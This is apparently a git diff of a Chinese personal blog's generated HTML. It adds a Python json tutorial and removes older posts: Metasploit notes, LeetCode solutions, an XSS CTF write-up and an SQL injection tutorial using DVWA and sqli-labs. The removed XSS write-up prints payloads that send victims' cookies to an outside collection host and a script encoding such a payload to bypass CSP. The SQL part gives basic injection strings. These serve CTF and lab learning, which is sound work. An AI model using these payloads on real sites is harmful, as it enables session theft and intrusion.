+loads json 解码
+load json 解码，从文件读取数据</code></pre><p>示例</p>
+<pre><code>import json
+    list=&quot;a b c h j k&quot;.split(&apos; &apos;)
+    print(list)
+with open(&apos;json_pickle.txt&apos;,&apos;w&apos;) as f:
+    json.dump(list,f)
+with open(&apos;json_pickle.txt&apos;,&apos;r&apos;) as f:
+    d2=json.load(f)
+print(d2)</code></pre><p>输出：</p>
+<pre><code>[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]
+[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;h&apos;, &apos;j&apos;, &apos;k&apos;]</code></pre><p>json不能对自定义对象进行序列化和反序列化。</p>
+<pre><code>import json
+class Car:
+    def __init__(self,brand):
+        self.brand=brand
+    def show(self):
+        print(&quot;the car belongs to&quot;+self.brand)
+car=Car(&apos;法拉利&apos;)
+def car2dict(car):
+return {
+&apos;brand&apos;: car.brand,
+}
+
+# 对自定义类的对象进行序列化操作
+print(json.dumps(car, default=car2dict))</code></pre><p>##python序列化及反序列化中的安全问题</p>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/04/11/python序列化及反序列化/" data-id="ck9gz156j000d9sv9i31zws75" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="new-tie-san-webshell" class="article article-type-new" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/03/15/tie-san-webshell/" class="article-date">
@@ -182,7 +609,7 @@ event: worker_connections 每个进程允许的最大连接数
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="ck7sz7kn70009w4v9h2jgib39" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/tie-san-webshell/" data-id="ck9gz156i000c9sv9ijni1h68" class="article-share-link">Share</a>
       
       
     </footer>
@@ -295,7 +722,7 @@ print(url)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="ck7sz7kn10007w4v9ct8kiklh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/python-urllib/" data-id="ck9gz156h000b9sv9z5lfnd01" class="article-share-link">Share</a>
       
       
     </footer>
@@ -416,7 +843,7 @@ if __name__ == &apos;__main__&apos;:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ck7sz7kmj0002w4v93zxm9tqz" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/15/buuoj-Hack-World-easy-tornado/" data-id="ck9gz156a00059sv939zghujx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -612,7 +1039,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ck7sz7kmr0004w4v9mv4bcl3j" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/03/10/leetcode-dynamic-programming-2/" data-id="ck9gz156d00079sv91xaqrpdn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -798,530 +1225,7 @@ return dp[s.length()-1]；
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/03/08/leetcode-动态规划-2/" data-id="ck7sz7kmy0006w4v9ax53ig7u" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Metasploit学习笔记" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/02/29/Metasploit学习笔记/" class="article-date">
-  <time datetime="2020-02-29T13:18:12.756Z" itemprop="datePublished">2020-02-29</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="Metasploit学习笔记"><a href="#Metasploit学习笔记" class="headerlink" title="#Metasploit学习笔记"></a>#Metasploit学习笔记</h2><p><strong>1.简介</strong></p>
-<p>目前最流行，最强大，最具拓展性的渗透测试平台。</p>
-<p>2003年由HD More发布第一版。由Ruby语言编写</p>
-<p>开发版本的更新非常活跃</p>
-<p><strong>2.Metasploit Framework</strong></p>
-<p>Metasploit Framework是由Ruby语言编写，想要了解更深层次的框架需要对Ruby语言有一定的了解。Metasploit所有的任务都是基于模块实现的，有利于拓展和编写代码。</p>
-<p>Metasploit Framework的框架组成结构可以分为：库，接口，模块。</p>
-<p><strong>3.Metasploit Framework库</strong></p>
-<p>库是已经封装好的可用程序。用户可以在完成逻辑的前提下调用库。</p>
-<p>库的文件目录：<br>    usr/share/mteasploit-framework/lib<br>其中rex库提供各种利用漏洞的类库，也提供套接字连接，原始函数和各种其他形式的重新格式化。core库给所有新模块提供基本的API。</p>
-<p><strong>4.Metasploit Framework接口</strong></p>
-<p>Metasploit Framework提供两个接口：控制台和GUI接口。终端输入    <code>msfconsole</code> 启动Metasploit Framework。</p>
-<p><strong>5.Metasploit Framework模块</strong></p>
-<p>主要技术功能模块有：Payload模块（成功exploit后，真正在系统执行的代码和指令），辅助模块，POST模块，编码器模块，NOP模块，exploit模块（对于每个漏洞的攻击方法），evasion模块，auxiliary(常被用来扫描)等。</p>
-<p>框架目录 <code>usr/share/metasploit-framework/modules</code><br>shellcode是获取shell的代码，属于payload。payload包含三种：single（只要通过内存跳转连接到目标就计算机就可以独立执行所有的代码），stager（目标计算机内存有限无法single时，先建立一个网络连接，为在黑客电脑上下载其他payload），stages（利用stager建立连接下载的payload）。</p>
-<p>#Metasploit-Framework的控制台命令</p>
-<hr>
-<p>banner 查看metasploit的基本信息</p>
-<p>help 查看命令</p>
-<p>connect 连接到目标服务器的指定端口（类似nc）</p>
-<p>show 展示模块的信息(非常重要的命令)</p>
-<p>search 搜索模块和漏洞的名称，进行模糊匹配</p>
-<p>check 检查是否可用</p>
-<p>back 退回msf console</p>
-<p>下面以ms08_067为例：<code>search msf08_067</code> 找到这个漏洞利用模块，<code>use exploit/windows/smb/msf08_067_netapi</code> 进入这个漏洞利用模块。<code>show options</code> 显示相应的选项信息。</p>
-<p>在设置过程中要用到的命令：</p>
-<pre><code>set ：设置模块的参数，比如设置rhost(目标主机)
-unset：清除设置
-setg：全局设置，即只要有那个名称变量，都会被设置成一样的）
-unsetg ：清除全局设置
-save：保存设置的值，即保存之后退出仍然会存在
-Run / exploit ：相同的作用，都用于执行
-jobs：进行的工作
-load：调用加载其他插件
-unload：取消调用加载其他插件
-loadpath ：当有个人开发的模块，调用指定目录存放的模块
-Session：可以看到回话，即已经建立的连接
-– session -l / -i 可以进入响应的shell（Shell 、Meterpreter session、VNC等不同的回话）
-route通过指定session添加路由流量，即当开防火墙端口有漏洞，已经控制了，攻击者路由指定session通向建立的连接路由到被攻击者的机器。原理即是：流量转发的过程
-irb：内置的编程开发模块
-Resource ：前面已经介绍过了，即指定资源文件，存的就是配置信息（将各种命令存入文件当中）</code></pre><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><hr>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/29/Metasploit学习笔记/" data-id="ck7sz7km40001w4v95b7xzaw2" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-leetcode-动态规划-1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/02/25/leetcode-动态规划-1/" class="article-date">
-  <time datetime="2020-02-25T09:59:29.059Z" itemprop="datePublished">2020-02-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="leetcode寒假刷题—动态规划（1）（Java实现）"><a href="#leetcode寒假刷题—动态规划（1）（Java实现）" class="headerlink" title="#leetcode寒假刷题—动态规划（1）（Java实现）"></a>#leetcode寒假刷题—动态规划（1）（Java实现）</h2><p>#5.最长回文子串</p>
-<p> 动态规划思路：</p>
-<p><strong>1.定义状态</strong></p>
-<p> 动态规划实际上就是记录每个状态，每个状态受到之前状态影响。所以，需要定义一个数组（记录每个状态）。这里定义二维数组dp，最小状态dp[i][j]就是记录从第i+1到第j+1的子串是否为回文子串。</p>
-<p><strong>2.确定临界状态</strong></p>
-<p>很容易就能看出每个字符都相当于一个长度为1的回文子串。所以二维数组对角线元素值都为1。</p>
-<p><strong>3.确定状态转移方程</strong></p>
-<p>dp[j][i]==（s[i]==s[j]）&amp;&amp;dp[j+1][i-1]</p>
-<p>代码如下</p>
-<pre><code>class Solution {
-public String longestPalindrome(String s) {
-if(s.length()==0)
-{
-    return &quot;&quot;;
-}
-boolean [][]dp=new boolean[s.length()][s.length()];
-for(int i=0;i&lt;s.length();i++)
-{
-    dp[i][i]=true;//把对角线元素都设为true，因为每个字符也可以当成回文子串
-}
-int maxlen=1;
-int b=0;
-for(int i=0;i&lt;s.length();i++)
-{
-    for(int j=0;j&lt;i;j++)
-    {
-        if(s.charAt(i)==s.charAt(j))
-        {
-            if(i-j&gt;2)
-                {
-                    dp[j][i]=dp[j+1][i-1];
-             }
-            else
-            {
-                dp[j][i]=true;
-            }
-        }
-        else
-        {
-            dp[j][i]=false;
-        }
-        if(dp[j][i])
-        {
-            if(i-j+1&gt;maxlen)
-            {
-                b=j;
-                maxlen=i-j+1;
-            }
-        }
-    }
-}
-        return s.substring(b,b+maxlen);//返回最长回文子串
-    }
-}</code></pre><p>时间复杂度：O(N^2)</p>
-<p>空间复杂度：O(N^2)<br> )，二维 dp 问题，一个状态得用二维有序数对表示，因此空间复杂度是 O(N^2)。</p>
-<p><strong>4.改进</strong></p>
-<p><strong>中心扩散</strong></p>
-<p>假设字符串的某个字符是回文子串的中心，尝试从此点开始向两端扩散。如果子串是偶数子串，该中心就是这个回文子串的字符间的空隙。若是奇数子串，就是字符。<br>因此中心扩散法的思路是：遍历每一个索引，以这个索引为中心，利用“回文串”中心对称的特点，往两边扩散，看最多能扩散多远。</p>
-<p><strong>代码实现</strong></p>
-<pre><code>public class Solution {
-
-public String longestPalindrome(String s) {
-    int len = s.length();
-    if (len &lt; 2) {
-        return s;
-    }
-    int maxLen = 1;
-    String res = s.substring(0, 1);
-    // 中心位置枚举到 len - 2 即可,因为中心位置只可能是下标1到len-2。下标0和len-1是无法向两端扩散的
-    for (int i = 0; i &lt; len - 1; i++) {
-        String os = centerSpread(s, i, i);
-        String es = centerSpread(s, i, i + 1);
-        String maxLenStr = os.length() &gt; es.length() ? os :es;//找到是奇数子串长度长还是偶数子串长度长
-        if (maxLenStr.length() &gt; maxLen) {
-            maxLen = maxLenStr.length();
-            res = maxLenStr;
-        }
-    }
-    return res;
-}
-
-private String centerSpread(String s, int left, int right) {
-    // left = right 的时候，此时回文中心是一个字符，回文串的长度是奇数
-    // right = left + 1 的时候，此时回文中心是一个空隙，回文串的长度是偶数
-    int len = s.length();
-    int i = left;
-    int j = right;
-    while (i &gt;= 0 &amp;&amp; j &lt; len) {
-        if (s.charAt(i) == s.charAt(j)) {
-            i--;
-            j++;
-        } else {
-            break;
-        }
-    }
-    // 不满足while条件，此时得到的最大满足条件的子串是下标为i+1到j-1的字符组成的，所以，substring方法的两个参数为i+1，j(substring方法不会截取第二个参数所在下标的字符)
-    return s.substring(i + 1, j);
-}
-}</code></pre><p>时间复杂度：O(N^2)，遍历每个可能的中心时间复杂度为O(N)，而在centerSpread中，向两端扩撒的时间复杂度为O(N)。因此总时间复杂度为O(N^2)。</p>
-<p>空间复杂度：O(1)，只使用到常数个临时变量，与字符串长度无关。</p>
-<hr>
-<p>#53.最大子序和</p>
-<p><strong>1.定义状态</strong></p>
-<p>dp[i]为以下标为i的元素结束的子序中元素相加最大的子序的元素和。</p>
-<p><strong>2.确定临界状态</strong></p>
-<p>dp[0]=下标为0的元素的值</p>
-<p><strong>3.确定状态转移方程</strong></p>
-<p>dp[i]=max(dp[i-1]+nums[i],nums[i])//nums[i]为下标为i的元素</p>
-<p>代码如下</p>
-<pre><code>class Solution {
-public int maxSubArray(int[] nums) {
-    int []dp=new int[nums.length];//定义dp数组记录状态
-    dp[0]=nums[0];
-    int max=dp[0];
-    for(int i=1;i&lt;nums.length;i++)
-    {
-        dp[i]=Math.max(dp[i-1]+nums[i],nums[i]);//状态转义方程
-        max=Math.max(max,dp[i]);
-    }
-}
-    return max;
-}</code></pre><p>时间复杂度：O(N)</p>
-<p>空间复杂度：O(N)</p>
-<p><strong>4.改进</strong></p>
-<p>动态规划实际上就是空间换时间，所以空间复杂度相对较大。但是一些情况下可以改进空间复杂度，如本题而言，由于状态转移方程为max(dp[i-1]+nums[i],nums[i]),每个状态都和前一个状态相关。那么，就可以定义一个变量记录前一状态的值（dp[i-1]）。这样空间复杂度就由O(N)变为了O(1)。</p>
-<pre><code>class Solution {
-public int maxSubArray(int[] nums) {
-    int ans = nums[0];
-    int sum = 0;
-    for(int num: nums) {
-        if(sum &gt; 0) {//即dp[i-1]+nums[i]&gt;nums[i]
-            sum += num;
-        } else {
-            sum = num;
-        }
-        ans = Math.max(ans, sum);
-    }
-        return ans;
-}
-}</code></pre><p>时间复杂度：O(N)</p>
-<p>空间复杂度：O(1)</p>
-<hr>
-<p>#62.不同路径</p>
-<p><strong>1.定义状态</strong></p>
-<p>dp[i][j]表示从起点到第i+1行j+1列路径数</p>
-<p><strong>2.定义临界状态</strong></p>
-<p>由题意可知，从某点开始行进只能向下或向右走（只能从一个点的左边或上边来到该点）。而在第一行，只能从其左边的点走至该点。在第一列，只能从该点上面的点来到此点。<br>所以对于第一行元素dp[0][i],都有dp[0][i]=1,对应的，对于第一列元素dp[i][0]，都有dp[i][0]=1。</p>
-<p><strong>3.定义状态转换方程</strong></p>
-<p>dp[i][j]=dp[i-1][j]+dp[i]<a href="1<=i<n;1<=j<m">j-1</a></p>
-<p>代码如下</p>
-<pre><code>class Solution {
-public int uniquePaths(int m, int n) {//n为行数，m为列数
-    int [][]dp=new int[n][m];
-    for(int i=0;i&lt;m;i++)
-    {
-        dp[0][i]=1;
-    }
-    for(int i=0;i&lt;n;i++)
-    {
-        dp[i][0]=1;
-    }
-    for(int i=1;i&lt;n;i++)
-    {
-        for(int j=1;j&lt;m;j++)
-        {
-            dp[i][j]=dp[i-1][j]+dp[i][j-1];
-        }
-    }
-    return dp[n-1][m-1];
-}
-}</code></pre><p>时间复杂度：O(m*n)</p>
-<p>空间复杂度：O(m*n)</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/02/25/leetcode-动态规划-1/" data-id="ck7sz7kmo0003w4v9rksi7l8y" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-xss" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/12/02/xss/" class="article-date">
-  <time datetime="2019-12-02T14:16:00.117Z" itemprop="datePublished">2019-12-02</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><hr>
-<p><strong>1.什么是xss</strong></p>
-<p>跨站脚本（XSS, Cross Site Script）攻击指的是，攻击者可以让某网站执行一段非法脚本。这种情况很常见，比如提交一个表单用于修改用户名，我们可以在文本框中输入一些特殊字符，比如 &lt;, &gt;, ‘, ” 等，检查一下用户名是否正确修改了。</p>
-<p>xss的三种类型<br>反射型xss 应用程序或API包括未经验证和未经转义的用户输入 作为HTML输出的一部分 </p>
-<p>存储型xss 存储在服务器中加入代码，如果没有过滤或过滤不严，那么这些代码将储存到，<br>服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，是永久型的。判断是否存在存储型xss时，首先要确定输入点和输入点。查看源码，如果输入的内容在HTML标签内，输入的内容无法被当成JavaScript代码运行。因为浏览器解析时，会把数据以文本形式输出在网页中，此时就需要构造语句 <code>/script&gt;alert(1)&lt;/script&gt;</code>来去闭合HTML标签。</p>
-<p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是<br>一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和<br>样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，<br>如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它<br>不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有<br>经过严格确认，就会产生DOM XSS漏洞。</p>
-<hr>
-<p><strong>检测xss</strong></p>
-<p>检测xss一般有两种方式，一种是手工检测，另一种是软件检测。这里直接介绍手工检测。输入一些敏感字符，例如’&lt;’,’&gt;’,’()’。提交请求后查看HTML源代码，看这些字符是否被转义。如果输出字符，说明程序很有可能做了过滤。这是在知道输出位置的情况下，另一种””/&gt;***”。手工检测目的就是为了看web应用是否有漏洞。最多的是考虑哪里有输入，数据该在什么地方输出。</p>
-<hr>
-<p><strong>2.BUU XSS COURSE1</strong></p>
-<p>题目链接：<a href="https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201" target="_blank" rel="noopener">https://buuoj.cn/challenges#BUU%20XSS%20COURSE%201</a></p>
-<p>打开发现让我们输入内容提交，类似于论坛的发表评论。很容易就能想到这是存储型xss,攻击者提交恶意代码到服务器中，当其他用户访问页面时就会触发这些恶意代码。从而造成cookie泄露。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191202194217583.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>先试试直接提交<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,发现没法弹窗，说明网站有限制,可能过滤了script那么试试img标签事件报错<code>&lt;img src=&#39;abc&#39; onerror=&#39;alert(1)&#39;/&gt;</code> 可以弹窗，说明这里有xss点。</p>
-<p>接着上传js恶意代码。</p>
-<pre><code>&lt;img src=&apos;/aaaww&apos; onerror=&quot;(function(){(new
-Image()).src=&apos;http://xss.buuoj.cn/index.php?
-do=api&amp;id=PkXQxo&amp;location=&apos;+escape((function()
-{try{return document.location.href}catch(e){return &apos;&apos;}})())
-+&apos;&amp;toplocation=&apos;+escape((function(){try{return
-top.location.href}catch(e){return &apos;&apos;}})())
-+&apos;&amp;cookie=&apos;+escape((function(){try{return
-document.cookie}catch(e){return &apos;&apos;}})())
-+&apos;&amp;opener=&apos;+escape((function(){try{return (window.opener
-&amp;&amp; window.opener.location.href)?
-window.opener.location.href:&apos;&apos;}catch(e){return &apos;&apos;}})());})();&quot;/&gt;</code></pre><p><img src="https://img-blog.csdnimg.cn/20191202194601319.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<p>注意这里的id应该是你在xss平台创建的项目代码的id。打开xss平台，收到上传的信息。发现里面有cookie phpSESSIONID这就是网站管理员的cookie。还能看到http referer（信息来源的地址）我们用这个管理员的cookie去访问referer里的网址，利用Firefox的插件editcookie更改网站的cookie就能得到flag。改变flag我们可以用hackbar。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191202194719634.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
-<hr>
-<p><strong>3.CISCN web2</strong></p>
-<p>题目链接  <a href="https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2" target="_blank" rel="noopener">https://buuoj.cn/challenges#[CISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8C%97%E8%B5%9B%E5%8C%BA]Web2</a></p>
-<p>writeup链接：<a href="https://www.zhaoj.in/read-6100.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6100.html</a></p>
-<p>看到投稿界面，很容易想到通过利用xss漏洞来把恶意脚本上传，这是典型的存储型xss。</p>
-<p>试试在投稿界面写入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>。打开保存信息的页面，发现啥都没有。那我们可以看看这个保存页面的源代码，发现<br><code>&lt;meta http-equiv=&quot;content-security-policy&quot; content=&quot;default-src &#39;self&#39;; script-src &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;&quot;&gt;</code></p>
-<p>在网上搜索了一下，content-security-policy指的是内容安全策略。其核心思想十分简单：网站通过发送一个 CSP 头部，来告诉浏览器什么是被授权执行的与什么是需要被禁止的。其被誉为专门为解决XSS攻击而生的神器。</p>
-<p>回过来看，可以明白javascript脚本被禁了，所以我们没法直接上传javascript代码。具体研究一下发现被转码了。怎么能绕过？这里要用到HTML markup。把我们要上传的javascript代码转成markup,可以用python脚本来转成markup。</p>
-<pre><code>in_str = &quot;(function(){window.location.href=&apos;http://xss.buuoj.cn/index.php?do=api&amp;id=xpqwIP&amp;keepsession=0&amp;location=&apos;+escape((function(){try{return document.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;toplocation=&apos;+escape((function(){try{return top.location.href}catch(e){return&apos;&apos;}})())+&apos;&amp;cookie=&apos;+escape((function(){try{return document.cookie}catch(e){return&apos;&apos;}})())+&apos;&amp;opener=&apos;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;}catch(e){return&apos;&apos;}})());})();&quot;
-
-output = &quot;&quot;
-
-for c in in_str:
-output += &quot;&amp;#&quot; + str(ord(c))
-
-print(&quot;&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34&quot; + output + &quot;&amp;#34&amp;#41&lt;/script&gt;&quot;)</code></pre><p>提交一下,同样利用xss平台获取cooike。访问时发现了页面让我们输入id名称，输入一下，发现报错，说明了这里可能是sql联合注入。利用sqlmap跑一下。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/12/02/xss/" data-id="ck7sz7kn50008w4v9kujbuzxt" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-新文档" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2019/10/22/新文档/" class="article-date">
-  <time datetime="2019-10-22T06:54:32.862Z" itemprop="datePublished">2019-10-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="sql注入基础"><a href="#sql注入基础" class="headerlink" title="sql注入基础"></a>sql注入基础</h1><h2 id="0x01sql语句基础："><a href="#0x01sql语句基础：" class="headerlink" title="#0x01sql语句基础："></a>#0x01sql语句基础：</h2><p><strong>1.select语句</strong></p>
-<p>格式：</p>
-<p>select * from table（从table表中获取字段信息）</p>
-<p> select * from table where (在满足where后的条件下查询字段信息)</p>
-<p><strong>2.insert语句</strong></p>
-<p>格式：</p>
-<p>insert into table(field1,field2) values(value1,value2)</p>
-<p><strong>3.update语句</strong></p>
-<p>格式：</p>
-<p>update table1 set field1=value1 where</p>
-<p><strong>4.delete语句</strong></p>
-<p>格式：</p>
-<p>delete from table1 where</p>
-<p><strong>5.order子句</strong></p>
-<p>ORDER BY 语句用于根据指定的列对结果集进行排序。</p>
-<p>ORDER BY 语句默认按照升序对记录进行排序</p>
-<p>如果想要把结果集按照倒序，则需要加上desc关键字</p>
-<p>在sql注入中经常利用order by子句显示目标有多少字段</p>
-<p><strong>6.and和or运算符</strong></p>
-<p>AND 和 OR 可在 WHERE 子语句中把两个或多个条件结合起来。</p>
-<p>如果第一个条件和第二个条件都成立，则 AND 运算符显示一条记录。</p>
-<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
-<p>and 和 or的用处在万能密码中就可以体现出来：</p>
-<pre><code>Select * from admin where username=’admin’ and password=’’ or 1=1</code></pre><p>在sql语句中，and的优先级是大于or的。username=’admin’的条件（1）为真，password=’’的条件（2）是假的<br>那么1 and 2=false，在与第三个条件 1=1（3）为真 进行 false or 3=true，结果就是真。 所以，有时候在执行sql注入，执行的语句后就会加上 or 1=1，目的就是利用sql and 和 or 运算符的优先级的差别，来达到用户想要的目的（语句为真，执行输入的语句）</p>
-<h2 id="0x02什么是sql注入"><a href="#0x02什么是sql注入" class="headerlink" title="#0x02什么是sql注入?:"></a>#0x02什么是sql注入?:</h2><pre><code>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</code></pre><p>简单的说就是网页的后台没有对用户发送的语句（以参数的方式传递）进行过滤，使得用户发送的语句直接被sql解释器执行。</p>
-<h2 id="0x03原理分析："><a href="#0x03原理分析：" class="headerlink" title="#0x03原理分析："></a>#0x03原理分析：</h2><p>我们可以利用DVWA平台去分析sql注入的原理，DVWA的平台搭建和sqli-labs和upload-labs类似，首先需要php运行环境。把下载的文件夹放到网站根目录（WWW）。</p>
-<pre><code>&lt;?php
-
-if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) {
-    // Get input
-    $id = $_REQUEST[ &apos;id&apos; ];
-
-    // Check database
-    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;
-    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );
-
-    // Get results
-    while( $row = mysqli_fetch_assoc( $result ) ) {
-        // Get values
-        $first = $row[&quot;first_name&quot;];
-        $last  = $row[&quot;last_name&quot;];
-
-        // Feedback for end user
-        $html .= &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;
-    }
-
-    mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);
-}
-
-?&gt;</code></pre><p><img src="/%E6%8D%95%E8%8E%B73.png" alt></p>
-<p>如果用户在userid文本框输入ID，输入的语句就会作为id参数的值通过GET(POST)方法提交到后台。通过sql解释器执行，并返回数据库查询的结果。也就是说，如果id传入的不只是一个数字，而是一条语句那么id的值就会被sql解释器执行。例如，用户令id=1’ and 1=1 order by 4 #,那么$query就会变成</p>
-<pre><code>$query=&quot;SELECT first_name,last_name FROM users WHERE user_id=&apos;1&apos; and 1=1 order by 4#&quot;</code></pre><p>这样就能查询数据库信息了</p>
-<h1 id="0x05sqli-labs"><a href="#0x05sqli-labs" class="headerlink" title="0x05sqli-labs"></a>0x05sqli-labs</h1><hr>
-<p>sqli-labs是基于php环境的平台，使用前需要安装php集成环境（php+apache+mysql,部分关卡需要tomcat+java+mysql）。</p>
-<p>sqli-labs下载地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p>
-<p>这里还有一个sqli-labs原作者的教程：<a href="https://www.bilibili.com/video/av24783387?t=69" target="_blank" rel="noopener">https://www.bilibili.com/video/av24783387?t=69</a></p>
-<p><strong>下面结合sqli-labs上的一些基础题目来介绍一些简单的sql注入方式。</strong></p>
-<h1 id="0x06less01-联合查询"><a href="#0x06less01-联合查询" class="headerlink" title="0x06less01(联合查询)"></a>0x06less01(联合查询)</h1><hr>
-<p>在了解题目要求之前，我们先来认识一下sql语句中union操作符。</p>
-<p>union操作符的作用是合并多个select语句的结果集，但是使用union时，要保证union操作符内部的select语句要有相同的列</p>
-<p>具体语法：</p>
-<pre><code>select column1 from table1 union select column2 from table2</code></pre><p>注意：union操作符是不会返回相同的值。</p>
-<p>union all</p>
-<p>作用与union类似，都是合并多个select语句的结果集，但是可以返回重复的值。</p>
-<p>题目要求：让用户上传一个参数’id’。</p>
-<p><strong>1.判断注入点</strong></p>
-<p>首先我们要找到注入点，判断注入点的常用方法之一就是在参数后加上一个单引号或双引号（因为sql语句添加引号会影响到sql语句的闭合，从而报错），如果报错，就可能存在注入点。当然，手工判断注入点的方法还有利用and运算符（and 1=1,and 1=2 ,and ‘1’=1）,利用特殊字符报错等等，在这里，就不详细介绍了。</p>
-<p>通过尝试可以发现添加单引号后页面会有报错信息，说明页面存在注入点。</p>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy85MjE2NjMxLWY1NTlmNDUyMmUyYjQ0ZjMucG5n?x-oss-process=image/format,png" alt></p>
-<p>接下来就可以构造?id= 1’ ****语句实现注入了。</p>
-<p><strong>2.使用 order by子句判断数据库的列数</strong></p>
-<p>前面已经介绍了order by子句的作用，当order by子句后面的数字大于当前数据库的列数，语句就会出错。</p>
-<p>输入id=1’ order by 4–+发现页面返回信息 “unknown columns ‘4’” 说明当前数据库的列数是小于4的。</p>
-<p><img src="https://img-blog.csdnimg.cn/20191005170005919.JPG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3p5ZGJrMTIzNDU2,size_16,color_FFFFFF,t_70" alt></p>
